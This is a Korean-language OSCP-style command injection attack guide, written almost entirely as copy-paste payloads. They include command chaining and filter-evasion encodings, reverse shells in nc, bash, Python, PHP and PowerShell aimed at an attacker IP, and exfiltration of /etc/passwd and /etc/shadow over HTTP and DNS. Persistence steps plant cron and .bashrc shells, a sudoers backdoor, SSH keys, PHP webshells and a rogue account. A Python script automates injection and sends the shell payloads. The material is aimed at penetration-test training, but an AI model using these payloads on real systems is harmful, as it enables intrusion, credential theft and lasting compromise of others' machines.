# Command Injection - OSCP 공격 가이드

> **목표: 시스템 명령어 실행 취약점을 통한 즉시 시스템 접근 → 리버스 쉘 획득**

## ⚡ 기본 페이로드들 (즉시 복사-붙여넣기)

### 🔗 명령어 체이닝 기본

```bash
# 세미콜론 (;) - 이전 명령어 결과와 무관하게 실행
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la

# AND 연산자 (&&) - 이전 명령어 성공시에만 실행
127.0.0.1 && whoami
127.0.0.1 && id
127.0.0.1 && uname -a
127.0.0.1 && pwd

# OR 연산자 (||) - 이전 명령어 실패시에만 실행
invalidcommand || whoami
failedping || id
nonexistent || cat /etc/passwd

# 파이프 (|) - 이전 명령어 출력을 다음 명령어 입력으로
echo test | whoami
ping -c 1 127.0.0.1 | whoami
ls | id

# 백틱 (`) - 명령어 치환
`whoami`
`id`
`cat /etc/passwd`
`uname -a`
ping `whoami`.{ATTACKER_IP}

# 달러 괄호 $() - 명령어 치환 (bash)
$(whoami)
$(id)
$(cat /etc/passwd)
$(uname -a)
ping $(whoami).{ATTACKER_IP}
```

### 🐧 리눅스 정보 수집

```bash
# 시스템 정보
; uname -a
; cat /etc/os-release
; cat /etc/issue
; cat /proc/version
; hostname

# 사용자 정보
; whoami
; id
; cat /etc/passwd
; cat /etc/shadow
; cat /etc/group
; w
; who

# 네트워크 정보
; ifconfig
; ip addr
; netstat -antup
; ss -tulpn
; arp -a
; route -n

# 프로세스 및 서비스
; ps aux
; ps -ef
; service --status-all
; systemctl list-units
; crontab -l
; cat /etc/crontab

# 파일 시스템
; ls -la /
; ls -la /home
; ls -la /var/www
; find / -perm -4000 2>/dev/null
; find / -writable 2>/dev/null
```

### 🪟 윈도우 정보 수집

```cmd
# 시스템 정보
& systeminfo
& hostname
& ver
& echo %USERNAME%
& echo %COMPUTERNAME%

# 사용자 정보
& whoami
& whoami /priv
& net user
& net localgroup administrators
& net group "domain admins" /domain

# 네트워크 정보
& ipconfig /all
& netstat -an
& arp -a
& route print

# 프로세스 및 서비스
& tasklist
& wmic process list brief
& net start
& sc query

# 파일 시스템
& dir C:\
& dir C:\Users
& dir C:\inetpub\wwwroot
& type C:\Windows\System32\drivers\etc\hosts
```

## 🎯 상황별 페이로드

### 🔍 Blind Command Injection 탐지

```bash
# 시간 지연 기반 탐지 (리눅스)
; sleep 10
&& sleep 15
|| sleep 20
| sleep 5
`sleep 10`
$(sleep 15)

# 시간 지연 기반 탐지 (윈도우)
& timeout 10
& ping -n 10 127.0.0.1
& choice /c y /n /d y /t 10

# DNS 기반 Out-of-band 탐지
; nslookup {RANDOM}.{ATTACKER_DOMAIN}
; dig {RANDOM}.{ATTACKER_DOMAIN}
; host {RANDOM}.{ATTACKER_DOMAIN}
`nslookup $(whoami).{ATTACKER_DOMAIN}`
$(nslookup $(id | base64).{ATTACKER_DOMAIN})

# HTTP 기반 Out-of-band 탐지
; curl http://{ATTACKER_IP}:8080/$(whoami)
; wget http://{ATTACKER_IP}:8080/$(id)
& certutil.exe -urlcache -split -f http://{ATTACKER_IP}:8080/test.txt
```

### 🐚 리버스 쉘 획득

```bash
# Netcat 리버스 쉘 (리눅스)
; nc -e /bin/sh {ATTACKER_IP} 443
; nc -c /bin/sh {ATTACKER_IP} 443
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 443 >/tmp/f

# Bash 리버스 쉘
; bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
; exec 5<>/dev/tcp/{ATTACKER_IP}/443;cat <&5 | while read line; do $line 2>&5 >&5; done

# Python 리버스 쉘
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP 리버스 쉘
; php -r '$sock=fsockopen("{ATTACKER_IP}",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell 리버스 옘 (윈도우)
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 📤 데이터 추출

```bash
# Base64 인코딩으로 데이터 추출
; cat /etc/passwd | base64
; cat /etc/shadow | base64 -w 0

# DNS를 통한 데이터 추출
; cat /etc/passwd | xxd -p -c 32 | while read line; do nslookup $line.{ATTACKER_DOMAIN}; done

# HTTP POST로 데이터 전송
; curl -X POST -d "data=$(cat /etc/passwd | base64)" http://{ATTACKER_IP}:8080/data

# 파일을 웹 디렉토리에 복사
; cp /etc/passwd /var/www/html/passwd.txt
; cp /etc/shadow /tmp/shadow.txt && chmod 644 /tmp/shadow.txt

# 압축해서 전송
; tar -czf /tmp/data.tar.gz /etc/passwd /etc/shadow /home
; curl -F "file=@/tmp/data.tar.gz" http://{ATTACKER_IP}:8080/upload
```

## 🔄 우회 기법들

### 🚫 공백 필터 우회

```bash
# ${IFS} 사용 (Internal Field Separator)
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;ls${IFS}-la
127.0.0.1&&whoami${IFS}

# 탭 문자 사용
127.0.0.1;cat	/etc/passwd
127.0.0.1;ls	-la

# $() 내에서 공백 사용
127.0.0.1;$(cat /etc/passwd)
127.0.0.1;$(/bin/ls -la)

# 환경변수 활용
127.0.0.1;cat$IFS/etc/passwd
127.0.0.1;ls$IFS-la$IFS/home

# 괄호 사용
(cat /etc/passwd)
(whoami)
(id)

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/home}
```

### 🔤 키워드 필터 우회

```bash
# 문자열 연결
127.0.0.1;c'a't /etc/pass'w'd
127.0.0.1;c"a"t /etc/pass"w"d
127.0.0.1;ca\t /etc/pass\wd

# 변수 활용
127.0.0.1;a=c;b=at;$a$b /etc/passwd
127.0.0.1;cmd=cat;$cmd /etc/passwd

# Hex 인코딩
127.0.0.1;echo -e "\x63\x61\x74 \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | sh

# Base64 인코딩
127.0.0.1;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# ASCII 값 활용
127.0.0.1;$(printf "\143\141\164 \057\145\164\143\057\160\141\163\163\167\144")

# 와일드카드 사용
127.0.0.1;c?t /etc/pass??
127.0.0.1;c*t /etc/pass*d
127.0.0.1;/bin/c?t /etc/pass??
```

### 🛡️ 특수문자 필터 우회

```bash
# 세미콜론(;) 필터시 다른 구분자 사용
127.0.0.1%0Awhoami
127.0.0.1%0Dcat /etc/passwd
127.0.0.1|whoami
127.0.0.1||whoami
127.0.0.1&&whoami

# 슬래시(/) 필터시 우회
127.0.0.1;cat$(echo${IFS}${PATH}|cut${IFS}-c1)etc$(echo${IFS}${PATH}|cut${IFS}-c1)passwd
127.0.0.1;cat ${HOME:0:1}etc${HOME:0:1}passwd

# 점(.) 필터시 우회
127${IFS}0${IFS}0${IFS}1;whoami
127\\.0\\.0\\.1;whoami

# 대괄호 우회
127.0.0.1;cat /etc/pass[w]d
127.0.0.1;cat /etc/[p]asswd

# 중괄호 확장 우회
127.0.0.1;cat /etc/{passwd,shadow}
127.0.0.1;{cat,/etc/passwd}
```

### 🌐 URL 인코딩 우회

```bash
# 기본 URL 인코딩
127.0.0.1%3Bwhoami
127.0.0.1%3B%20cat%20/etc/passwd
127.0.0.1%26%26whoami

# 이중 URL 인코딩
127.0.0.1%253Bwhoami
127.0.0.1%253B%2520cat%2520/etc/passwd

# 유니코드 인코딩
127.0.0.1%u003Bwhoami
127.0.0.1%u003B%u0020cat%u0020/etc/passwd

# HTML 엔티티
127.0.0.1&#59;whoami
127.0.0.1&#59;&#32;cat&#32;/etc/passwd
```

## 🤖 자동화 도구 명령어

### 🔪 Commix (Command Injection Exploiter)

```bash
# 기본 Command Injection 탐지
commix -u "http://{TARGET_IP}/page.php?ip=127.0.0.1"

# POST 파라미터 테스트
commix -u "http://{TARGET_IP}/page.php" --data="ip=127.0.0.1"

# Cookie 기반 테스트
commix -u "http://{TARGET_IP}/page.php" --cookie="ip=127.0.0.1"

# User-Agent 헤더 테스트
commix -u "http://{TARGET_IP}/page.php" --user-agent="*"

# 특정 페이로드 시도
commix -u "http://{TARGET_IP}/page.php?ip=*" --technique=B

# 프록시 사용 (Burp Suite)
commix -u "http://{TARGET_IP}/page.php?ip=*" --proxy=http://127.0.0.1:8080

# OS 명령어 실행
commix -u "http://{TARGET_IP}/page.php?ip=*" --os-cmd="whoami"

# 쉘 획득
commix -u "http://{TARGET_IP}/page.php?ip=*" --os-shell

# 파일 읽기
commix -u "http://{TARGET_IP}/page.php?ip=*" --file-read="/etc/passwd"

# 파일 업로드
commix -u "http://{TARGET_IP}/page.php?ip=*" --file-upload="/tmp/shell.php" --file-dest="/var/www/html/"
```

### 🔥 Burp Suite Intruder

```bash
# 1. Command Injection 페이로드 리스트 생성
; whoami
&& whoami
|| whoami
| whoami
`whoami`
$(whoami)
%0Awhoami
%0D%0Awhoami
127.0.0.1;whoami
127.0.0.1&&whoami

# 2. Burp Intruder 설정
# Position: ip=127.0.0.1§§
# Payload Type: Simple list
# Payload Options: 위의 페이로드 리스트 추가

# 3. 응답 분석
# Grep - Extract: www-data, root, nt authority
# Grep - Match: uid=, gid=, groups=
```

### 🐍 커스텀 Python 스크립트

```python
#!/usr/bin/env python3
import requests
import sys
import time

def test_command_injection(url, param):
    # 기본 명령어 주입 페이로드들
    payloads = [
        "; whoami",
        "&& whoami",
        "|| whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "%0Awhoami",
        "; sleep 5",
        "&& sleep 5"
    ]

    print(f"[+] Testing Command Injection on: {url}")

    for payload in payloads:
        test_value = f"127.0.0.1{payload}"

        try:
            # 시간 기반 탐지를 위한 시작 시간
            start_time = time.time()

            # GET 파라미터 테스트
            if '?' in url:
                test_url = f"{url}&{param}={test_value}"
            else:
                test_url = f"{url}?{param}={test_value}"

            response = requests.get(test_url, timeout=10)

            # 응답 시간 계산
            response_time = time.time() - start_time

            # 결과 분석
            if any(indicator in response.text.lower() for indicator in ['www-data', 'root:', 'uid=', 'gid=', 'nt authority']):
                print(f"[SUCCESS] Command executed: {payload}")
                print(f"Response snippet: {response.text[:200]}...")
                return True

            # 시간 기반 탐지 (sleep 명령어용)
            if "sleep" in payload and response_time > 4:
                print(f"[SUCCESS] Time-based detection: {payload} (Response time: {response_time:.2f}s)")
                return True

        except requests.exceptions.Timeout:
            if "sleep" in payload:
                print(f"[SUCCESS] Timeout-based detection: {payload}")
                return True
        except Exception as e:
            print(f"[-] Error testing {payload}: {e}")

    return False

def get_reverse_shell(url, param):
    # 리버스 쉘 페이로드들
    reverse_shells = [
        f"; nc -e /bin/sh {sys.argv[3]} 443",
        f"; bash -i >& /dev/tcp/{sys.argv[3]}/443 0>&1",
        f"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{sys.argv[3]}\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ]

    print(f"[+] Attempting to get reverse shell...")
    print(f"[+] Make sure nc listener is running: nc -lvnp 443")

    for shell in reverse_shells:
        test_value = f"127.0.0.1{shell}"

        try:
            if '?' in url:
                test_url = f"{url}&{param}={test_value}"
            else:
                test_url = f"{url}?{param}={test_value}"

            response = requests.get(test_url, timeout=5)
            print(f"[+] Tried: {shell[:50]}...")

        except requests.exceptions.Timeout:
            print(f"[+] Shell payload sent (timeout expected): {shell[:50]}...")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 cmdi_test.py <url> <parameter> [attacker_ip]")
        print("Example: python3 cmdi_test.py 'http://target.com/ping.php' ip 192.168.1.100")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    # Command Injection 테스트
    if test_command_injection(url, param):
        if len(sys.argv) == 4:
            get_reverse_shell(url, param)
    else:
        print("[-] No command injection detected")
```

### 🔧 Wfuzz를 이용한 자동화

```bash
# GET 파라미터 Command Injection 테스트
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt "http://{TARGET_IP}/page.php?ip=127.0.0.1FUZZ"

# POST 데이터 Command Injection 테스트
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -d "ip=127.0.0.1FUZZ" "http://{TARGET_IP}/page.php"

# 헤더 기반 Command Injection 테스트
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -H "User-Agent: MozillaFUZZ" "http://{TARGET_IP}/page.php"

# 응답 필터링 (성공적인 명령어 실행 탐지)
wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt --hh 1234 "http://{TARGET_IP}/page.php?ip=127.0.0.1FUZZ"
```

## 🚨 문제 해결

### ❌ 명령어가 실행되지 않을 때

```bash
# 1. 다른 명령어 체이닝 시도
; whoami
&& whoami
|| whoami
| whoami
`whoami`
$(whoami)

# 2. 다른 위치의 명령어 시도
; /bin/whoami
; /usr/bin/whoami
; which whoami
; whereis whoami

# 3. 환경변수 확인
; echo $PATH
; env
; printenv

# 4. 쉘 확인
; echo $SHELL
; echo $0
; ps $$
```

### 🔍 출력이 보이지 않을 때 (Blind)

```bash
# 1. 시간 기반 탐지
; sleep 10
; ping -c 10 127.0.0.1

# 2. DNS 기반 확인
; nslookup test.{ATTACKER_DOMAIN}
; dig $(whoami).{ATTACKER_DOMAIN}

# 3. 파일 기반 확인
; whoami > /var/www/html/test.txt
; echo "success" > /tmp/test.txt

# 4. 네트워크 기반 확인
; curl http://{ATTACKER_IP}:8080/test
; wget http://{ATTACKER_IP}:8080/$(whoami)

# 5. 에러 기반 확인
; cat /etc/passwd | mail root
; logger "Command injection successful: $(whoami)"
```

### 🚫 필터링이 강할 때

```bash
# 1. 인코딩 우회
; echo 'd2hvYW1p' | base64 -d | sh  # whoami를 base64 인코딩
; python -c "exec('print(__import__(\"os\").system(\"whoami\"))')"

# 2. 파일 시스템 활용
; ls /bin/* | grep cat
; find /bin -name "*cat*" -exec {} /etc/passwd \;

# 3. 환경변수 악용
; ${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd

# 4. 프로그래밍 언어 활용
; python -c "import os; os.system('whoami')"
; php -r "system('whoami');"
; perl -e "system('whoami')"
; ruby -e "system('whoami')"

# 5. 바이너리 실행
; echo -e "\x2f\x62\x69\x6e\x2f\x73\x68" | xargs
```

### 🔄 서비스가 재시작되는 경우

```bash
# 1. 지속성 확보
; echo '* * * * * /bin/bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' | crontab -
; echo '/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' >> ~/.bashrc

# 2. 백도어 설치
; echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
; mkdir ~/.ssh; echo 'ssh-rsa {PUBLIC_KEY}' > ~/.ssh/authorized_keys

# 3. 웹쉘 생성
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
; echo '<?php eval($_POST["cmd"]); ?>' > /tmp/.shell.php

# 4. 계정 생성
; useradd -m -s /bin/bash backup
; echo 'backup:password' | chpasswd
; usermod -aG sudo backup
```

### ⏱️ 응답 시간이 길 때

```bash
# 1. 백그라운드 실행
; whoami &
; (sleep 10; whoami) &

# 2. 출력 리다이렉션
; whoami > /tmp/result.txt 2>&1 &
; id > /var/www/html/result.txt &

# 3. 스크립트 생성 후 실행
; echo '#!/bin/bash' > /tmp/script.sh
; echo 'whoami > /tmp/out.txt' >> /tmp/script.sh
; chmod +x /tmp/script.sh
; /tmp/script.sh &
```

## 📊 성공 판정 기준

### ✅ Command Injection 성공 확인

- **사용자 정보**: `www-data`, `root`, `apache`, `nt authority\system` 출력
- **시스템 정보**: `Linux`, `Windows`, kernel 버전 정보 출력
- **파일 내용**: `/etc/passwd`, `/etc/shadow` 내용 출력
- **프로세스 정보**: `ps aux`, `tasklist` 결과 출력

### ✅ Blind Injection 성공 확인

- **시간 지연**: `sleep` 명령어로 의도한 시간만큼 지연
- **DNS 요청**: DNS 로그에서 지정한 도메인 요청 확인
- **HTTP 요청**: 웹 서버 로그에서 지정한 URL 요청 확인
- **파일 생성**: 지정한 위치에 파일 생성 확인

### ⏰ 시간 관리

- **5분**: 기본 Command Injection 테스트
- **15분**: 다양한 우회 기법 시도
- **25분**: Blind Injection + Out-of-band 테스트
- **30분**: 리버스 쉘 획득 시도
- **실패시**: 다른 웹 취약점으로 전환

**성공시 즉시 쉘 안정화!** → `SHELLS/shell-upgrade.md`

## 💡 실전 팁

- **파라미터 위치**: URL, POST 데이터, 헤더, 쿠키 모두 테스트
- **리버스 쉘**: nc 리스너 `nc -lvnp 443` 항상 준비
- **Out-of-band**: DNS 서버나 HTTP 서버 준비 (`python3 -m http.server 8080`)
- **인코딩**: Base64, URL, Hex 등 다양한 인코딩 시도
- **우회**: 공백, 특수문자, 키워드 필터 각각 다른 방법으로 우회
